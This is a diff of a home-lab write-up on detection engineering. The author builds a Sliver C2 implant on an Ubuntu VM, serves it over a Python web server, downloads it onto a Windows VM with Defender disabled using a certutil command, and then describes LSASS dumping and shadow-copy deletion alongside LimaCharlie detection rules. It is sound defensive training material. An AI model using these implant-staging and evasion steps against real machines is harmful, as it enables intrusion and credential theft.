@@ -12,7 +12,7 @@ First I spun up both virtual machines. The attack machine will run on Ubuntu Ser
 
 - Advanced understanding of EDR concepts and practical application.
 - Proficiency in analyzing and interpreting network telemetry.
-- Ability to generate, deploy, transfer, and execute a command-and-control (C2) payload on the Windows endpoint using Sliver.
+- Ability to generate, deploy, transfer, and execute a Command & Control payload on the Windows endpoint using Sliver.
 - Enhanced knowledge of Windows commands to gather information and assess system privileges.
 - Familiarization with normal vs. anomalous activity to enhance threat detection capabilities.
 - Development of critical thinking and problem-solving skills in cybersecurity.
@@ -33,11 +33,84 @@ monitoring and capturing telemetry, creating and applying detection rules.
 *Ref 1: Windows Security controls off*
 
 ![image](https://github.com/user-attachments/assets/415b034b-db82-4da7-bdf9-88b55b2f52c3)
+
 ![image](https://github.com/user-attachments/assets/9d6597e1-a266-4ab8-8852-72c1754aeede)
 
+![image](https://github.com/user-attachments/assets/0e89acb1-c5fe-4243-85f5-938961e2f978)
+
+![Disabling WinDefender via Registry Editor](https://github.com/user-attachments/assets/4e244807-80e6-41bd-9445-be3569724400)
+
+### Now that my Windows machine is vulnerable, it's time to SSH into my Ubuntu AttackBox.
+
+*Ref 2: Using PuTTY to connect via SSH*
+![Screenshot 2024-09-02 113412](https://github.com/user-attachments/assets/97f91ab3-c686-439a-b0c2-6c7954162a34)
+
+### Once in my Ubuntu machine I use the _'sudo su'_ command to temporarily gain root access, navigate to the sliver directory and launch Sliver-server.
+
+*Ref 3: Launching Sliver-server*
+
+![image](https://github.com/user-attachments/assets/bb40665c-01da-4dda-a41b-4d2cfb7b4e79)
+
+Using the command _'generate --http 192.168.247.129 --save /opt/sliver'_, I generate a Command & Control payload executable.
+
+*Ref 3: Generating C2 session payload*
+
+![SLIVER C2 payload GOOD_TWINE](https://github.com/user-attachments/assets/a1d170c5-f92d-4f9b-b112-41a524bf70ec)
+
+![GOOD_TWINE implant](https://github.com/user-attachments/assets/5409a0bf-3760-48b1-a7be-91e6f5fc16c3)
+
+Running the command _'implants'_ above, you’ll see it has created my payload with the random name **GOOD_TWINE**. 
+_We will be using this payload to infect the Windows machine in the next step..._
+
+### I exited Sliver and made sure I was in the sliver directory. 
+To download the C2 easily from the Linux VM to the Windows VM I spun up a temporary web server using Python
+
+_'python3 -m http.server 80'_
+
+![image](https://github.com/user-attachments/assets/14db0600-1b15-4087-a406-707710d04588)
+
+### I switched my attention to the Windows VM and launched an Administrative PowerShell console.
+Executing the command _'certutil.exe -f -urlcache http://192.168.247.129/GOOD_TWINE.exe GOOD_TWINE.exe'_ starts the download of my payload.
+
+![Malware Staged 2](https://github.com/user-attachments/assets/8fd84d5e-a28e-48cd-a13f-abc199bb91e3)
 
 
 
+![Sliver listening on port 80](https://github.com/user-attachments/assets/5fb00e9b-339c-445b-81d8-bc2b414a4008)
+
+![We are In!](https://github.com/user-attachments/assets/299b4831-809b-474f-8e88-d56db49344c5)
+
+![Inside the Windows machine](https://github.com/user-attachments/assets/0352ae0d-93e0-47cb-ae54-c729b6974974)
+
+![Checking user privs](https://github.com/user-attachments/assets/4bf919a8-2b4f-4892-88e2-3a1a14a2b577)
+
+![Identifying running processes in remote system](https://github.com/user-attachments/assets/a5abe060-f99e-404f-a6fa-2422107eb357)
+
+![Implant admin privs on Windows machine](https://github.com/user-attachments/assets/628cf8ab-4473-40b4-9a46-36a155edf91c)
+
+
+### Now that we have a live session between the two machines, the attack machine can begin peeking around, checking priveleges, getting host information, and checking what type of security the host has.
+Using _'getprivs'_ and _'ps -T'_
+
+Part 3 - Emulating an adversary for crafting detections
+
+Now time to go into Lima Charlie to see the noise!
+
+Going into the sensors tab, I can see that my windows machine is online
+
+On the host machine we can look inside our LimaCharlie SIEM and see telemetry from the attacker. We can identify the payload thats running and see the IP its connected to.
+
+We can also use LimaCharlie to scan the hash of the payload through VirusTotal; however, it will be clean since we just created the payload ourselves.
+
+Now on the attack machine we can simulate an attack to steal credentials by dumping the LSASS memory. In LimaCharlie we can check the sensors, observe the telemetry, and write rules to detect the sensitive process.
+
+Part 4 - Blocking an attack
+
+Now instead of simply detection, we can practice using LimaCharlie to write a rule that will detect and block the attacks coming from the Sliver server. On the Ubuntu machine we can simulate parts of a ransomware attack, by attempting to delete the volume shadow copies. In LimaCharlie we can view the telemetry and then write a rule that will block the attack entirely. After we create the rule in our SIEM, the Ubuntu machine will have no luck trying the same attack again.
+
+Part 5 - Tuning false positives
+
+Part 6 - Trigger YARA scans with a detection rule
 
 
 
